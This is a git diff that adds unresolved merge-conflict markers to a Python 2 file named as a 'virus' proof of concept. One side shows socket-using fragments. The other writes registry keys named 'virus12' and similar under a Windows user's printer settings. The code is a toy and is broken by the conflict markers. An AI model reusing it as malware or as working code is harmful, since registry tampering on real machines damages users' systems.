@@ -1,3 +1,4 @@
+<<<<<<< HEAD:poc-poc/OPEN/virus2.py.py
 import _winreg
 from socket import *
 f=file(r"C:\Python27\Scripts\new2.txt",'w')
@@ -33,3 +34,22 @@ while 1:
 
 tcp.close()
 
+=======
+import _winreg
+
+k = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Printers\Defaults',0,_winreg.KEY_READ)
+info = _winreg.QueryInfoKey(k)
+for i in range(info[0]):
+               key = _winreg.EnumKey(k,i)
+                
+               if key=="New Key #1":
+                   k2 = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Printers\Defaults\New Key #1',0,_winreg.KEY_READ)
+                   
+                   gh=_winreg.CreateKeyEx(k2, "virus12")
+                   gh=_winreg.CreateKeyEx(k2, "virus523")
+                   gh=_winreg.CreateKeyEx(k2, "virus243")
+                   gh=_winreg.CreateKeyEx(k2, "virus7432")
+                  
+        
+print "ddddddd"
+>>>>>>> f07fbe483e985bb0e2101f38c08ae398cf98fa59:poc/REGISTRY/virus.py
